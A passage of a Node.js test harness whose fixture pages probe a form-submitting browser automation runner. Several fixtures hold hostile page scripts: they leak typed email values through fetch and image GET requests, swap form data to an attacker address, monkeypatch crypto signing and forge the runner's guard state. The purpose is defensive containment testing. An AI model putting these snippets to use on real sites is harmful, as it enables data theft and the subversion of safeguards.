        var adopted = document.adoptNode(inert.querySelector('link'));
        hintShadow.replaceChildren(adopted);
        state.textContent = adopted && adopted.isConnected
          ? 'closed-shadow-replace-children:usable'
          : 'closed-shadow-replace-children:unexpected-return';
      } catch (error) {
        state.textContent = 'closed-shadow-replace-children:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'shadow-inner-html') {
      try {
        hintShadow.innerHTML = '<link rel="preconnect" href="' + destination + '">';
        var inserted = hintShadow.querySelector('link[rel~="preconnect"]');
        state.textContent = inserted && inserted.isConnected
          ? 'shadow-inner-html:usable'
          : 'shadow-inner-html:unexpected-return';
      } catch (error) {
        var escaped = hintShadow.querySelector('link[rel~="preconnect"]');
        state.textContent = escaped && escaped.isConnected
          ? 'shadow-inner-html:usable-after-throw'
          : 'shadow-inner-html:blocked';
      }
      return;
    }
    var hint = document.createElement('link');
    hint.rel = 'author';
    hint.href = location.origin + '/harmless-author-link';
    document.head.appendChild(hint);
    if (!hint.isConnected) {
      state.textContent = 'connected-hint:setup-failed';
      return;
    }
    hint.href = destination;
    try {
      if (${JSON.stringify(mutation)} === 'rel-setter') {
        hint.rel = 'preconnect';
      } else {
        hint.relList.add('preconnect');
      }
      state.textContent = hint.isConnected && hint.relList.contains('preconnect')
        ? ${JSON.stringify('connected-' + mutation + ':usable')}
        : ${JSON.stringify('connected-' + mutation + ':unexpected-return')};
    } catch (error) {
      state.textContent = hint.isConnected && !hint.relList.contains('preconnect')
        ? ${JSON.stringify('connected-' + mutation + ':blocked')}
        : ${JSON.stringify('connected-' + mutation + ':usable-after-throw')};
    }
  }
  var hintShadow = document.getElementById('shadow-host').attachShadow({
    mode: ${JSON.stringify(mutation)}.startsWith('closed-shadow-') ? 'closed' : 'open'
  });
  if (${JSON.stringify(phase)} === 'pre-chooser') {
    document.getElementById('native-email').addEventListener('input', attemptConnectedHintMutation, { once: true });
  }
  if (${JSON.stringify(phase)} === 'activation') {
    document.getElementById('send').addEventListener('pointerdown', attemptConnectedHintMutation, { once: true });
  }
</script>`;

const nativeGetExfilPage = (channel) => `<!doctype html><meta charset="utf-8"><title>Native GET containment</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">GET containment fixture</div>
<script>
  document.getElementById('native-email').addEventListener('input', function (event) {
    var url = '/native-get-exfil?channel=' + ${JSON.stringify(channel)}
      + '&value=' + encodeURIComponent(event.currentTarget.value);
    if (${JSON.stringify(channel)} === 'fetch') {
      fetch(url).catch(function () {});
      return;
    }
    var image = new Image();
    image.src = url;
    document.body.appendChild(image);
  });
</script>`;

const NATIVE_DELAYED_ACTIVATION_GET = `<!doctype html><meta charset="utf-8"><title>Native delayed activation GET containment</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">delayed activation GET fixture</div>
<script>
  document.getElementById('send').addEventListener('pointerdown', function () {
    setTimeout(function () {
      fetch('/native-get-exfil?channel=activation-delayed&value='
        + encodeURIComponent(document.getElementById('native-email').value)).catch(function () {});
    }, 0);
  }, { once: true });
</script>`;

const NATIVE_CROSS_SITE_COOKIE = `<!doctype html><meta charset="utf-8"><title>Native cross-site cookie application</title>
<form id="application_form" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">cross-site cookie fixture</div>
<script>
  document.getElementById('application_form').action = 'http://127.0.0.1:' + location.port + '/native-cookie-real';
</script>`;

const nativeRedirectPage = (action) => `<!doctype html><meta charset="utf-8"><title>Native redirect application</title>
<form id="application_form" action="${action}" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted">redirect fixture</div>`;

const NATIVE_IFRAME_CLONE = `<!doctype html><meta charset="utf-8"><title>Native iframe clone application</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-name">Name</label><input id="native-name" name="name">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Send</button>
</form>
<iframe id="clone-frame"></iframe>
<div id="submitted">iframe clone fixture</div>
<script>
  var applicationForm = document.getElementById('application_form');
  var cloneFrame = document.getElementById('clone-frame');
  var cloneDocument = cloneFrame.contentDocument;
  cloneDocument.open();
  cloneDocument.write('<form id="clone_form" action="/native-real" method="post"><input name="email" value="applicant@example.com"><input name="name" value="Mehek"><input name="resume" type="file"></form>');
  cloneDocument.close();
  applicationForm.addEventListener('submit', function (event) {
    event.preventDefault();
    new FormData(applicationForm);
    var cloneForm = cloneDocument.getElementById('clone_form');
    cloneForm.action = applicationForm.action;
    cloneFrame.contentWindow.location.assign(cloneForm.action);
  });
</script>`;

const NATIVE_FORMDATA_CRYPTO_MONKEYPATCH = `<!doctype html><meta charset="utf-8"><title>Native formdata mutation</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted">formdata mutation fixture</div>
<script>
  SubtleCrypto.prototype.sign = function () {
    return Promise.resolve(new Uint8Array(32).buffer);
  };
  document.getElementById('application_form').addEventListener('formdata', function (event) {
    event.formData.set('email', 'attacker@example.com');
  });
</script>`;

const NATIVE_PAGE_STATE_FORGERY = `<!doctype html><meta charset="utf-8"><title>Native page-state forgery</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted">page-state forgery fixture</div>
<script>
  Event.prototype.preventDefault = function () {};
  var applicationForm = document.getElementById('application_form');
  document.getElementById('send').addEventListener('click', function () {
    applicationForm.noValidate = true;
    var forgedState = {
      status: 'allowed',
      reason: null,
      finalize: function () { return { status: 'allowed', reason: null }; }
    };
    var forgedGuards = new Map([['page-forged-token', forgedState]]);
    try {
      Object.defineProperty(globalThis, '__litosSubmitActivationGuards', {
        value: forgedGuards,
        configurable: true
      });
    } catch {}
    var visibleGuards = globalThis.__litosSubmitActivationGuards;
    if (visibleGuards instanceof Map) {
      for (var state of visibleGuards.values()) {
        state.status = 'allowed';
        state.reason = null;
        state.finalize = forgedState.finalize;
      }
    }
  });
</script>`;

const nativeValidationBypassPage = (mode) => `<!doctype html><meta charset="utf-8"><title>Native validation bypass ${mode}</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data"${mode === 'form' ? ' novalidate' : ''}>
  <label for="native-email">Email</label><input id="native-email" name="email" type="email" required>
  <label for="native-code">Applicant code</label>
  <input id="native-code" name="code" required pattern="[A-Z]{3}">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file" required>
  <button id="send" type="submit"${mode === 'submitter' ? ' formnovalidate' : ''}>${mode === 'submitter' ? 'Submit application' : 'Send'}</button>
</form><div id="submitted">validation bypass fixture</div>`;

const nativeConstraintMutationPage = (mode) => `<!doctype html><meta charset="utf-8"><title>Native constraint mutation ${mode}</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email" required>
  <label for="native-code">Applicant code</label>
  <input id="native-code" name="code" required pattern="${mode === 'pattern' ? '[A-Z]{3}' : '[a-z]{3}'}">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file" required>
  <button id="send" type="submit">Send</button>
</form><div id="submitted">constraint mutation fixture</div>
<script>
  var nativeCode = document.getElementById('native-code');
  var nativeSubmit = document.getElementById('send');
  if (${JSON.stringify(mode)} === 'custom-validity') nativeCode.setCustomValidity('Applicant code is invalid');
  nativeSubmit.addEventListener('click', function () {
    if (${JSON.stringify(mode)} === 'pattern') nativeCode.removeAttribute('pattern');
    else nativeCode.setCustomValidity('');
  });
</script>`;

const FIXTURES = {
  '/ashby': ASHBY,
  '/greenhouse': GREENHOUSE,
  '/outscoring-decoy': OUTSCORING_DECOY,
  '/body-only': BODY_ONLY,
  '/ambiguous': AMBIGUOUS,
  '/nested': NESTED,
  '/footer-bar': FOOTER_BAR,
  '/footer-bar-furniture': FOOTER_BAR_FURNITURE,
  '/sibling-form': SIBLING_FORM,
  '/stray-newsletter': STRAY_NEWSLETTER,
  '/stray-filter': STRAY_FILTER,
  '/stray-subscribe': STRAY_SUBSCRIBE,
  '/stray-only': STRAY_ONLY,
  '/minimal-application': MINIMAL_APPLICATION,
  '/greenhouse-stray': GREENHOUSE_STRAY,
  '/recruitee-german': RECRUITEE_GERMAN,
  '/one-field-form': ONE_FIELD_FORM,
  '/eeo-sticky-bar': EEO_STICKY_BAR,
  '/screening-sticky-bar': SCREENING_STICKY_BAR,
  '/eeo-rich-decoy': EEO_RICH_DECOY,
  '/screening-rich-decoy': SCREENING_RICH_DECOY,
  '/scan-bounds': SCAN_BOUNDS,
  '/shadow': SHADOW,
  '/workable-bare-send': WORKABLE_BARE_SEND,
  '/contact-bare-send': CONTACT_BARE_SEND,
  '/candidate-support-bare-send': CANDIDATE_SUPPORT_BARE_SEND,
  '/application-feedback-bare-send': APPLICATION_FEEDBACK_BARE_SEND,
  '/application-support-bare-send': APPLICATION_SUPPORT_BARE_SEND,
  '/application-profile-bare-send': applicationIdentityDecoyPage('profile'),
  '/application-status-bare-send': applicationIdentityDecoyPage('status'),
  '/fill-by-phone-format': FILL_BY_PHONE_FORMAT,
  '/fill-by-inferred-phone-format': FILL_BY_INFERRED_PHONE_FORMAT,
  '/fill-by-select-label': FILL_BY_SELECT_LABEL,
  '/fill-by-select-punctuation': FILL_BY_SELECT_PUNCTUATION,
  '/fill-by-date-normalization': FILL_BY_DATE_NORMALIZATION,
  '/fill-by-inferred-date-normalization': FILL_BY_INFERRED_DATE_NORMALIZATION,
  '/workable-role-send': WORKABLE_ROLE_SEND,
  '/workable-explicit-role': WORKABLE_EXPLICIT_ROLE,
  '/workable-formaction-override': WORKABLE_FORM_ACTION_OVERRIDE,
  '/workable-explicit-override': WORKABLE_EXPLICIT_OVERRIDE,
  '/workable-form-target': WORKABLE_FORM_TARGET,
  '/workable-base-target': WORKABLE_BASE_TARGET,
  '/workable-association-decoy': WORKABLE_ASSOCIATION_DECOY,
  '/workable-control-state-drift': WORKABLE_CONTROL_STATE_DRIFT,
  '/workable-ambiguous-send': WORKABLE_AMBIGUOUS_SEND,
  '/workable-explicit-wins': WORKABLE_EXPLICIT_WINS,
  '/workable-form-drift': WORKABLE_FORM_DRIFT,
  '/workable-proof-loss-explicit-decoy': WORKABLE_PROOF_LOSS_EXPLICIT_DECOY,
  '/workable-activation-pointer-drift': activationDriftPage('pointer'),
  '/workable-activation-click-drift': activationDriftPage('click'),
  '/workable-prechooser-auto-submit': PRE_CHOOSER_AUTO_SUBMIT,
  '/job-alert-bare-send': JOB_ALERT_BARE_SEND,
  '/talent-pool-bare-send': TALENT_POOL_BARE_SEND,
  '/minimal-file-drift': MINIMAL_FILE_DRIFT,
  '/choice-drift': CHOICE_DRIFT,
  '/reparent-drift': REPARENT_DRIFT,
  '/confirmation-file-drift': confirmationDriftPage('file'),
  '/confirmation-sibling-drift': confirmationDriftPage('sibling'),
  '/confirmation-value-drift': confirmationDriftPage('value'),
  '/confirmation-class-change': confirmationDriftPage('class'),
  '/confirmation-hidden-drift': confirmationDriftPage('hidden'),
  '/confirmation-external-hidden-drift': confirmationDriftPage('external-hidden'),
  '/confirmation-consent-drift': confirmationDriftPage('consent'),
  '/over-bound-submitted-state': OVER_BOUND_SUBMITTED_STATE,
  '/forged-success-markers': FORGED_SUCCESS_MARKERS,
  '/workable-external-submit': WORKABLE_EXTERNAL_SUBMIT,
  '/workable-disabled-external-submit': WORKABLE_DISABLED_WITH_EXTERNAL_SUBMIT,
  '/workable-explicit-associated-decoy': WORKABLE_EXPLICIT_ASSOCIATED_DECOY,
  '/direct-marker-redirect': DIRECT_MARKER_REDIRECT,
  '/formless-state-drift': FORMLESS_STATE_DRIFT,
  '/external-associated-bare-send': EXTERNAL_ASSOCIATED_BARE_SEND,
  '/pre-chooser-base-drift': PRE_CHOOSER_BASE_DRIFT,
  '/pre-chooser-method-drift': PRE_CHOOSER_METHOD_DRIFT,
  '/selector-id-transfer': SELECTOR_ID_TRANSFER,
  '/failed-choice-strip': failedChoicePage(false),
  '/failed-choice-strip-v3': failedChoicePage(false).replace('>Send</button>', '>Submit</button>'),
  '/failed-choice-replace': failedChoicePage(true),
  '/external-required-control': EXTERNAL_REQUIRED_CONTROL,
  '/whole-form-failed-choice': WHOLE_FORM_FAILED_CHOICE,
  '/v3-detached-unrelated-failed-choice': V3_DETACHED_UNRELATED_FAILED_CHOICE,
  '/fill-target-swap': actionTargetSwapPage('fill'),
  '/fill-by-target-swap': actionTargetSwapPage('fillByLabelText'),
  '/select-target-swap': actionTargetSwapPage('select'),
  '/upload-target-swap': actionTargetSwapPage('upload'),
  '/custom-submit-choice': CUSTOM_SUBMIT_CHOICE,
  '/late-bare-reparent': lateChooserReparentPage(false),
  '/late-explicit-reparent': lateChooserReparentPage(true),
  '/reactivated-unrelated-form': REACTIVATED_UNRELATED_FORM,
  '/late-base-href-drift': LATE_BASE_HREF_DRIFT,
  '/history-parity': HISTORY_PARITY,
  '/shadow-bare-send': SHADOW_BARE_SEND,
  '/workable-unrelated-form': WORKABLE_WITH_UNRELATED_FORM,
  '/explicit-submit-only-unrelated-proof': EXPLICIT_SUBMIT_WITH_ONLY_UNRELATED_PROOF,
  '/text-repurpose-drift': TEXT_REPURPOSE_DRIFT,
  '/failed-text-persistence': FAILED_TEXT_PERSISTENCE,
  '/async-text-drift': ASYNC_TEXT_DRIFT,
  '/async-labelled-digit-drift': ASYNC_LABELLED_DIGIT_DRIFT,
  '/url-hop-start': URL_HOP_START,
  '/url-hop-wrong': URL_HOP_WRONG,
  '/initial-redirect-target': INITIAL_REDIRECT_TARGET,
  '/native-activation-normal': nativeActivationPage('normal'),
  '/native-activation-pointerdown': nativeActivationPage('pointerdown'),
  '/native-activation-mousedown': nativeActivationPage('mousedown'),
  '/native-activation-focus': nativeActivationPage('focus'),
  '/native-activation-click': nativeActivationPage('click'),
  '/native-activation-submit-action': nativeActivationPage('submit-action'),
  '/native-activation-submit-association': nativeActivationPage('submit-association'),
  '/native-activation-submit-aria-required': nativeActivationPage('submit-aria-required'),
  '/native-activation-submit-star-marker': nativeActivationPage('submit-star-marker'),
  '/native-activation-submit-cancel-direct-real': nativeActivationPage('submit-cancel-direct-real'),
  '/native-activation-pre-arm-required': nativeActivationPage('pre-arm-required'),
  '/native-activation-cached-direct-real': nativeActivationPage('cached-direct-real'),
  '/native-activation-cached-direct-decoy': nativeActivationPage('cached-direct-decoy'),
  '/native-activation-synthetic-witness': nativeActivationPage('synthetic-witness'),
  '/workable-native-allowlist': WORKABLE_NATIVE_ALLOWLIST,
  '/workable-native-allowlist-empty': WORKABLE_NATIVE_ALLOWLIST_EMPTY,
  '/native-activation-iframe-clone': NATIVE_IFRAME_CLONE,
  '/native-constraint-custom-validity-clear': nativeConstraintMutationPage('custom-validity'),
  '/native-constraint-pattern-removal': nativeConstraintMutationPage('pattern'),
  '/native-formdata-crypto-monkeypatch': NATIVE_FORMDATA_CRYPTO_MONKEYPATCH,
  '/native-page-state-forgery': NATIVE_PAGE_STATE_FORGERY,
  '/native-serializer-empty-file': NATIVE_SERIALIZER,
  '/native-serializer-populated-file': NATIVE_SERIALIZER,
  '/native-multipart-serializer': NATIVE_MULTIPART_SERIALIZER,
  '/native-multipart-serializer-empty': NATIVE_MULTIPART_SERIALIZER,
  '/native-file-byte-substitution': NATIVE_FILE_BYTE_SUBSTITUTION,
  '/native-text-value-getter-spoof': NATIVE_TEXT_VALUE_GETTER_SPOOF,
  '/native-select-value-getter-spoof': NATIVE_SELECT_VALUE_GETTER_SPOOF,
  '/native-textarea-whitespace-drift': NATIVE_TEXTAREA_WHITESPACE_DRIFT,
  '/native-hidden-choice-label-spoof': NATIVE_HIDDEN_CHOICE_LABEL_SPOOF,
  '/native-legacy-verifier-write-drift': NATIVE_LEGACY_VERIFIER_WRITE_DRIFT,
  '/native-main-world-primordial-patches': NATIVE_MAIN_WORLD_PRIMORDIAL_PATCHES,
  '/native-nameless-proof-controls': NATIVE_NAMELESS_PROOF_CONTROLS,
  '/native-multi-select-injection': NATIVE_MULTI_SELECT_INJECTION,
  '/native-form-owner-getter-spoof': NATIVE_FORM_OWNER_GETTER_SPOOF,
  '/native-forged-submit-label': NATIVE_FORGED_SUBMIT_LABEL,
  '/native-hidden-submit-text': NATIVE_HIDDEN_SUBMIT_TEXT,
  '/native-opacity-zero-submit': NATIVE_OPACITY_ZERO_SUBMIT,
  '/native-optin-value-getter-spoof': NATIVE_OPTIN_VALUE_GETTER_SPOOF,
  '/native-required-selector-spoof': NATIVE_REQUIRED_SELECTOR_SPOOF,
  '/native-custom-required-selector-spoof': NATIVE_CUSTOM_REQUIRED_SELECTOR_SPOOF,
  '/native-custom-required-aria-only': NATIVE_CUSTOM_REQUIRED_ARIA_ONLY,
  '/native-required-class-marker-spoof': NATIVE_REQUIRED_CLASS_MARKER_SPOOF,
  '/native-required-star-marker-spoof': NATIVE_REQUIRED_STAR_MARKER_SPOOF,
  '/native-required-unassociated-star-marker-spoof': NATIVE_REQUIRED_UNASSOCIATED_STAR_MARKER_SPOOF,
  '/native-required-disabled-choice-peer': nativeRequiredPayloadParityPage('disabled-choice'),
  '/native-required-native-disabled-choice-peer': nativeRequiredPayloadParityPage('native-disabled-choice'),
  '/native-required-mixed-choice-peer': nativeRequiredPayloadParityPage('mixed-choice'),
  '/native-required-disabled-option': nativeRequiredPayloadParityPage('disabled-option'),
  '/native-required-disabled-optgroup': nativeRequiredPayloadParityPage('disabled-optgroup'),
  '/native-required-native-disabled-option': nativeRequiredPayloadParityPage('native-disabled-option'),
  '/native-required-native-disabled-optgroup': nativeRequiredPayloadParityPage('native-disabled-optgroup'),
  '/native-required-empty-option': nativeRequiredPayloadParityPage('empty-option'),
  '/native-optional-hidden-star': NATIVE_OPTIONAL_HIDDEN_STAR,
  '/native-starred-legend-empty': nativeStarredLegendPage('empty'),
  '/native-starred-legend-answered': nativeStarredLegendPage('answered'),
  '/native-starred-legend-hidden-backing': nativeStarredLegendPage('hidden'),
  '/native-custom-required-mixed-group': NATIVE_CUSTOM_REQUIRED_MIXED_GROUP,
  '/native-custom-required-display-contents': NATIVE_CUSTOM_REQUIRED_DISPLAY_CONTENTS,
  '/native-custom-required-oversized-owner': NATIVE_CUSTOM_REQUIRED_OVERSIZED_OWNER,
  '/native-barred-required-controls': NATIVE_BARRED_REQUIRED_CONTROLS,
  '/native-external-custom-required-empty': nativeExternalRequiredOwnerPage('custom-empty'),
  '/native-external-custom-required-answered': nativeExternalRequiredOwnerPage('custom-answered'),
  '/native-external-marker-required-empty': nativeExternalRequiredOwnerPage('marker-empty'),
  '/native-external-aria-owns-empty': nativeExternalAriaOwnsPage(false),
  '/native-external-aria-owns-answered': nativeExternalAriaOwnsPage(true),
  '/native-required-fieldset-empty': nativeRequiredFieldsetPage(false),
  '/native-required-fieldset-answered': nativeRequiredFieldsetPage(true),
  '/native-aria-label-drift': NATIVE_ARIA_LABEL_DRIFT,
  '/native-aria-label-choice-proof': NATIVE_ARIA_LABEL_CHOICE_PROOF,
  '/native-unselected-image-control': NATIVE_UNSELECTED_IMAGE_CONTROL,
  '/native-userinfo-action': NATIVE_USERINFO_ACTION,
  '/native-late-file-getter-substitution': NATIVE_LATE_FILE_GETTER_SUBSTITUTION,
  '/native-reversible-file-proof-swap': NATIVE_REVERSIBLE_FILE_PROOF_SWAP,
  '/native-websocket-pre-chooser': nativeWebSocketPage('pre-chooser'),
  '/native-websocket-activation': nativeWebSocketPage('activation'),
  '/native-rtc-pre-chooser': nativeRouteInvisibleConstructorPage('rtc', 'pre-chooser'),
  '/native-webtransport-activation': nativeRouteInvisibleConstructorPage('webtransport', 'activation'),
  '/native-websocketstream-pre-chooser': nativeRouteInvisibleConstructorPage('websocketstream', 'pre-chooser'),
  '/native-websocketstream-activation': nativeRouteInvisibleConstructorPage('websocketstream', 'activation'),
  '/native-serviceworker-pre-chooser': nativeRouteInvisibleConstructorPage('serviceworker', 'pre-chooser'),
  '/native-popup-route-invisible': NATIVE_POPUP_ROUTE_INVISIBLE,
  '/native-document-open-popup': NATIVE_DOCUMENT_OPEN_POPUP,
  '/native-data-frame-hint': NATIVE_DATA_FRAME_HINT,
  '/native-data-popup-hint': NATIVE_DATA_POPUP_HINT,
  '/native-initial-script-transport': NATIVE_INITIAL_SCRIPT_TRANSPORT,
  '/native-dns-prefetch-pre-chooser': nativeRouteInvisibleHintPage('dns-prefetch', 'pre-chooser'),
  '/native-preconnect-activation': nativeRouteInvisibleHintPage('preconnect', 'activation'),
  '/native-connected-rel-pre-chooser': nativeConnectedHintMutationPage('rel-setter', 'pre-chooser'),
  '/native-connected-rel-list-activation': nativeConnectedHintMutationPage('rel-list', 'activation'),
  '/native-shadow-hint-inner-html': nativeConnectedHintMutationPage('shadow-inner-html', 'pre-chooser'),
  '/native-closed-shadow-replace-children': nativeConnectedHintMutationPage('closed-shadow-replace-children', 'pre-chooser'),
  '/native-closed-shadow-large-fragment': nativeConnectedHintMutationPage('closed-shadow-large-fragment', 'pre-chooser'),
  '/native-closed-shadow-entity-inner-html': nativeConnectedHintMutationPage('closed-shadow-entity-inner-html', 'pre-chooser'),
  '/native-closed-shadow-attr-node-value': nativeConnectedHintMutationPage('closed-shadow-attr-node-value', 'pre-chooser'),
  '/native-closed-shadow-named-node-map': nativeConnectedHintMutationPage('closed-shadow-named-node-map', 'pre-chooser'),
  '/native-variadic-document-write': nativeConnectedHintMutationPage('variadic-document-write', 'pre-chooser'),
  '/native-nested-iframe-srcdoc': nativeConnectedHintMutationPage('nested-iframe-srcdoc', 'pre-chooser'),
  '/native-move-before-hint': nativeConnectedHintMutationPage('move-before', 'pre-chooser'),
  '/native-exec-command-hint': nativeConnectedHintMutationPage('exec-command-insert-html', 'pre-chooser'),
  '/native-stateful-rel-coercion': nativeConnectedHintMutationPage('stateful-rel-coercion', 'pre-chooser'),
  '/native-safe-string-replace-children': nativeConnectedHintMutationPage('safe-string-replace-children', 'pre-chooser'),
  '/native-safe-class-list-token': nativeConnectedHintMutationPage('safe-class-list-token', 'pre-chooser'),
  '/native-safe-markup-primitives': nativeConnectedHintMutationPage('safe-markup-primitives', 'pre-chooser'),
  '/native-shadow-href-attribute': nativeConnectedHintMutationPage('closed-shadow-href-attribute', 'pre-chooser'),
  '/native-shadow-href-named-map': nativeConnectedHintMutationPage('closed-shadow-href-named-map', 'pre-chooser'),
  '/native-shadow-url-component': nativeConnectedHintMutationPage('closed-shadow-url-component', 'pre-chooser'),
  '/native-get-exfil-fetch': nativeGetExfilPage('fetch'),
  '/native-get-exfil-image': nativeGetExfilPage('image'),
  '/native-get-exfil-activation-delayed': NATIVE_DELAYED_ACTIVATION_GET,
  '/native-cross-site-cookie': NATIVE_CROSS_SITE_COOKIE,
  '/native-get-unsupported': nativeRedirectPage('/native-real').replace('method="post"', 'method="get"'),
  '/native-validation-novalidate': nativeValidationBypassPage('form'),
  '/native-validation-formnovalidate': nativeValidationBypassPage('submitter'),
  '/native-redirect-preserve-method': nativeRedirectPage('/native-redirect-307'),
  '/native-redirect-receipt': nativeRedirectPage('/native-receipt-redirect'),
  '/native-redirect-userinfo-receipt': nativeRedirectPage('/native-receipt-userinfo-redirect'),
  '/native-redirect-cookie-receipt': nativeRedirectPage('/native-receipt-cookie-redirect'),
  '/native-redirect-fragment-receipt': nativeRedirectPage('/native-receipt-fragment-redirect')
};

const clicks = [];
const transportRequests = [];
const getExfilRequests = [];
const websocketConnections = [];
const websocketFrames = [];
const server = http.createServer((request, response) => {
  const url = new URL(request.url, 'http://127.0.0.1');
  if (url.pathname === '/record-click') {
    clicks.push(url.searchParams.get('who'));
    response.writeHead(204, { connection: 'close' });
    response.end();
    return;
  }
  if (url.pathname === '/native-get-exfil') {
    getExfilRequests.push({
      method: request.method,
      channel: url.searchParams.get('channel'),
      value: url.searchParams.get('value')
    });
    response.writeHead(204, { connection: 'close' });
    response.end();
    return;
  }
  if (url.pathname === '/initial-redirect') {
    response.writeHead(302, { location: '/initial-redirect-target', connection: 'close' });
    response.end();
    return;
  }
  if (url.pathname === '/native-real'
    || url.pathname === '/native-decoy'
    || url.pathname === '/native-multipart-real'
    || url.pathname === '/native-file-integrity-real'
    || url.pathname === '/native-integrity-real'
    || url.pathname === '/native-cookie-real'
    || url.pathname === '/native-redirect-307'
    || url.pathname === '/native-receipt-redirect'
    || url.pathname === '/native-receipt-userinfo-redirect'
    || url.pathname === '/native-receipt'
    || url.pathname === '/native-receipt-cookie-redirect'
    || url.pathname === '/native-receipt-fragment-redirect'
    || url.pathname === '/native-receipt-cookie') {
    const chunks = [];
    const recordedRequest = { method: request.method, path: url.pathname, body: null };
    transportRequests.push(recordedRequest);
    request.on('data', (chunk) => { chunks.push(chunk); });
    request.on('end', () => {
      const bodyBuffer = Buffer.concat(chunks);
      recordedRequest.body = bodyBuffer.toString('utf8');
      const contentType = String(request.headers['content-type'] || '');
      if (/^multipart\/form-data(?:;|$)/i.test(contentType)) {
        recordedRequest.contentType = contentType;
        recordedRequest.bodyBase64 = bodyBuffer.toString('base64');
      }
      if (url.pathname === '/native-cookie-real') {
        recordedRequest.cookie = String(request.headers.cookie || '');
      }
      if (url.pathname === '/native-redirect-307') {
        response.writeHead(307, { location: '/native-decoy', connection: 'close' });
        response.end();
        return;
      }
      if (url.pathname === '/native-receipt-redirect') {
        response.writeHead(303, { location: '/native-receipt', connection: 'close' });
        response.end();
        return;
      }
      if (url.pathname === '/native-receipt-userinfo-redirect') {
        response.writeHead(303, {
          location: 'http://receipt:secret@127.0.0.1:' + server.address().port + '/native-receipt',
          connection: 'close'
        });
        response.end();
        return;
      }
      if (url.pathname === '/native-receipt-cookie-redirect') {
        response.writeHead(303, {
          location: '/native-receipt-cookie',
          'set-cookie': 'receipt_session=ready; Path=/; HttpOnly; SameSite=Lax',
          connection: 'close'
        });
        response.end();
        return;
      }
      if (url.pathname === '/native-receipt-fragment-redirect') {
        response.writeHead(303, { location: '/native-receipt#done', connection: 'close' });
        response.end();
        return;
      }
      if (url.pathname === '/native-receipt-cookie') {
        recordedRequest.cookie = String(request.headers.cookie || '');
        if (!recordedRequest.cookie.includes('receipt_session=ready')) {
          response.writeHead(403, { 'content-type': 'text/html; charset=utf-8', connection: 'close' });
          response.end('<div id="submitted">receipt cookie missing</div>');
          return;
        }
      }
      response.writeHead(200, { 'content-type': 'text/html; charset=utf-8', connection: 'close' });
      response.end(`<!doctype html><meta charset="utf-8"><title>Application received</title>
        <div id="submitted">Thank you for applying</div>`);
    });
    return;
  }
  const body = FIXTURES[url.pathname];
  if (!body) {
    response.writeHead(404, { connection: 'close' });
    response.end('no fixture');
    return;
  }
  response.writeHead(200, { 'content-type': 'text/html; charset=utf-8', connection: 'close' });
  response.end(body);
});
const webSocketServer = new WebSocketServer({ noServer: true });
server.on('upgrade', (request, socket, head) => {
  const url = new URL(request.url, 'http://127.0.0.1');
  if (url.pathname !== '/v4-websocket') {
    socket.destroy();
    return;
  }
  webSocketServer.handleUpgrade(request, socket, head, (client) => {
    webSocketServer.emit('connection', client, request);
  });
});
webSocketServer.on('connection', (client) => {
  websocketConnections.push('connected');
  client.on('message', (message) => {
    websocketFrames.push(Buffer.from(message).toString('utf8'));
    client.close();
  });
  setTimeout(() => client.close(), 250).unref();
});
await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));

const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'stratus-formless-scope-'));
fs.writeFileSync(path.join(workDir, 'stratus-runner.cjs'), SANDBOX_RUNNER);

const submitAction = {
  type: 'confirmAndSubmit',
  selector: 'button, input[type="submit"], input[type="button"], input[type="image"], [role="button"]',
  chooserPolicy: ATOMIC_SUBMIT_POLICY,
  label: 'final_submit',
  optional: false,
  maxRetries: 1,
  contractVersion: 2,
  submitKind: 'application'
};

const resultPath = (phase) => path.join(workDir, 'stratus-result-' + phase + '.json');
const readResult = (phase) => (fs.existsSync(resultPath(phase))
  ? JSON.parse(fs.readFileSync(resultPath(phase), 'utf8'))
  : null);

function writeInput(fixture, extras, overrides, before = []) {
  fs.writeFileSync(path.join(workDir, 'stratus-input.json'), JSON.stringify({
    url: `http://127.0.0.1:${server.address().port}${fixture}`,
    actions: [...before, submitAction, { type: 'extract', selector: '#submitted' }, ...extras],
    allowSubmit: true,
    submissionAttempt: SUBMISSION_ATTEMPT,
    providerDeadlineAt: providerDeadlineAt(),
    screenshot: false,
    waitUntil: 'networkidle',
    viewport: { width: 1440, height: 900 },
    ...overrides
  }));
}

function startRunner(extraEnv = {}) {
  const child = spawn(process.execPath, ['--require', path.join(HERE, 'managed-runner-shim.cjs'), 'stratus-runner.cjs'], {
    cwd: workDir,
    env: { ...process.env, ...extraEnv, NODE_PATH: path.join(process.cwd(), 'node_modules') },
    detached: process.platform !== 'win32'
